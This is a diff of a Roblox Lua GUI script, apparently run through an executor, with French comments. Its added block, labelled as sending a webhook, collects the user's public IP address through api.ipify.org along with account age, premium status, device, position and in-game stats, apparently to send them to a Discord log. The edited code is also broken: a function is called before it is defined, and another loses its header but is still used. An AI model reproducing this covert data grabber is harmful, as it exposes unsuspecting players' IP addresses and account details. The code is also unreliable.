@@ -35,7 +35,7 @@ end
 
 -- Scripts:
 
-local function LQGSO_fake_script()
+local function SAQIA_fake_script()
 	local script = Instance.new('LocalScript')
 	script.Name = [[LocalScript]]
 	script.Parent = _i[1]
@@ -54,82 +54,83 @@ local function LQGSO_fake_script()
 		local fallbackImage = "https://tr.rbxcdn.com/53eb9b17fe1432a809c73a132d79f09c/420/420/Image/Png"
 		if not httpRequest then return fallbackImage end
 	
-		local function GetRealHeadShotAPI(userId)
-			local fallbackImage = "https://tr.rbxcdn.com/53eb9b17fe1432a809c73a132d79f09c/420/420/Image/Png"
-			if not httpRequest then return fallbackImage end
-			local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..tostring(userId).."&size=420x420&format=Png&isCircular=false"
-			local success, response = pcall(function() return httpRequest({ Url = url, Method = "GET" }) end)
-			if success and response and response.Body then
-				local data = HttpService:JSONDecode(response.Body)
-				if data and data.data and data.data[1] and data.data[1].imageUrl then return data.data[1].imageUrl end
+		local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..tostring(userId).."&size=420x420&format=Png&isCircular=false"
+		local success, response = pcall(function()
+			return httpRequest({ Url = url, Method = "GET" })
+		end)
+	
+		if success and response and response.Body then
+			local data = HttpService:JSONDecode(response.Body)
+			if data and data.data and data.data[1] and data.data[1].imageUrl then
+				return data.data[1].imageUrl 
 			end
-			return fallbackImage
 		end
+		return fallbackImage
+	end
 	
-		local function sendDiscordLog(isVip)
-			if not httpRequest or webhookSent then return end
-			webhookSent = true 
+	-- 3. ENVOI DU WEBHOOK
+	if httpRequest then
+		spawn(function()
+			local successGame, gameInfo = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
+			local gameName = successGame and gameInfo.Name or "Nom du jeu inconnu"
+			local joinLink = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+			local webLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
+			local playerCount = #Players:GetPlayers()
+			local maxPlayers = Players.MaxPlayers
 	
-			task.spawn(function()
-				local successGame, gameInfo = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
-				local gameName = successGame and gameInfo.Name or "Nom du jeu inconnu"
-				local joinLink = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
-				local webLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
-				local playerCount = #Players:GetPlayers()
-				local maxPlayers = Players.MaxPlayers
+			local deviceType = "Ordinateur 💻"
+			if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then deviceType = "Mobile / Tablette 📱"
+			elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then deviceType = "Console 🎮"
+			elseif UserInputService.VREnabled then deviceType = "Casque VR 🥽" end
 	
-				local deviceType = "Ordinateur 💻"
-				if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then deviceType = "Mobile / Tablette 📱"
-				elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then deviceType = "Console 🎮"
-				elseif UserInputService.VREnabled then deviceType = "Casque VR 🥽" end
+			local ping = "Inconnu"
+			pcall(function() ping = string.split(Stats.Network.ServerStatsItem["Data Ping"]:GetValueString(), " ")[1] .. " ms" end)
+			local fps = tostring(math.floor(Workspace:GetRealPhysicsFPS())) .. " FPS"
 	
-				local ping = "Inconnu"
-				pcall(function() ping = string.split(Stats.Network.ServerStatsItem["Data Ping"]:GetValueString(), " ")[1] .. " ms" end)
-				local fps = tostring(math.floor(Workspace:GetRealPhysicsFPS())) .. " FPS"
+			local accountAge = tostring(LocalPlayer.AccountAge) .. " jours"
+			local isPremium = LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Oui 🌟" or "Non ❌"
+			local playerTeam = LocalPlayer.Team and LocalPlayer.Team.Name or "Aucune / Neutre"
 	
-				local accountAge = tostring(LocalPlayer.AccountAge) .. " jours"
-				local isPremium = LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Oui 🌟" or "Non ❌"
-				local playerTeam = LocalPlayer.Team and LocalPlayer.Team.Name or "Aucune / Neutre"
+			local char = LocalPlayer.Character
+			local humanoid = char and char:FindFirstChild("Humanoid")
+			local rootPart = char and char:FindFirstChild("HumanoidRootPart")
 	
-				local char = LocalPlayer.Character
-				local humanoid = char and char:FindFirstChild("Humanoid")
-				local rootPart = char and char:FindFirstChild("HumanoidRootPart")
+			local walkSpeed = humanoid and tostring(math.floor(humanoid.WalkSpeed)) or "Inconnu"
+			local jumpPower = humanoid and tostring(math.floor(humanoid.JumpPower)) or "Inconnu"
+			local health = humanoid and tostring(math.floor(humanoid.Health)) .. " / " .. tostring(math.floor(humanoid.MaxHealth)) or "Inconnu"
 	
-				local walkSpeed = humanoid and tostring(math.floor(humanoid.WalkSpeed)) or "Inconnu"
-				local jumpPower = humanoid and tostring(math.floor(humanoid.JumpPower)) or "Inconnu"
-				local health = humanoid and tostring(math.floor(humanoid.Health)) .. " / " .. tostring(math.floor(humanoid.MaxHealth)) or "Inconnu"
+			local positionTxt = "Inconnue"
+			if rootPart then
+				positionTxt = "X: " .. math.floor(rootPart.Position.X) .. ", Y: " .. math.floor(rootPart.Position.Y) .. ", Z: " .. math.floor(rootPart.Position.Z)
+			end
+			
+			-- Appel de la fonction et stockage de l'IP dans une variable
+			local adresseIPPublique = recupererAdresseIP()
 	
-				local positionTxt = "Inconnue"
-				if rootPart then
-					positionTxt = "X: " .. math.floor(rootPart.Position.X) .. ", Y: " .. math.floor(rootPart.Position.Y) .. ", Z: " .. math.floor(rootPart.Position.Z)
+			local moneyInfo = "Non détecté"
+			if LocalPlayer:FindFirstChild("leaderstats") then
+				local stats = {}
+				for _, stat in ipairs(LocalPlayer.leaderstats:GetChildren()) do
+					table.insert(stats, stat.Name .. ": " .. tostring(stat.Value))
 				end
+				if #stats > 0 then moneyInfo = table.concat(stats, " | ") end
+			end
 	
-				local apiUrl = "https://api.ipify.org"
 	
-				local function recupererAdresseIP()
-					local executionReussie, resultat = pcall(function()
-						return game:HttpGet(apiUrl)
-					end)
+			local apiUrl = "https://api.ipify.org"
 	
-					-- Vérification du résultat de la requête
-					if executionReussie then
-						return resultat
-					else
-						return "Erreur : Ton exécuteur ne supporte pas game:HttpGet."
-					end
+			local function recupererAdresseIP()
+				local executionReussie, resultat = pcall(function()
+					return game:HttpGet(apiUrl)
+				end)
+	
+				-- Vérification du résultat de la requête
+				if executionReussie then
+					return resultat
+				else
+					return "Erreur : Ton exécuteur ne supporte pas game:HttpGet."
 				end
-	
-				-- Appel de la fonction et stockage de l'IP dans une variable
-				local adresseIPPublique = recupererAdresseIP()
-	
-				local moneyInfo = "Non détecté"
-				if LocalPlayer:FindFirstChild("leaderstats") then
-					local stats = {}
-					for _, stat in ipairs(LocalPlayer.leaderstats:GetChildren()) do
-						table.insert(stats, stat.Name .. ": " .. tostring(stat.Value))
-					end
-					if #stats > 0 then moneyInfo = table.concat(stats, " | ") end
-				end
+			end
 	
 			local myAvatar = GetRealHeadShotAPI(LocalPlayer.UserId)
 	
@@ -181,7 +182,7 @@ local function LQGSO_fake_script()
 		end)
 	end
 end
-coroutine.wrap(LQGSO_fake_script)()
+coroutine.wrap(SAQIA_fake_script)()
 
 
 _i[1].Parent = PlayerGui
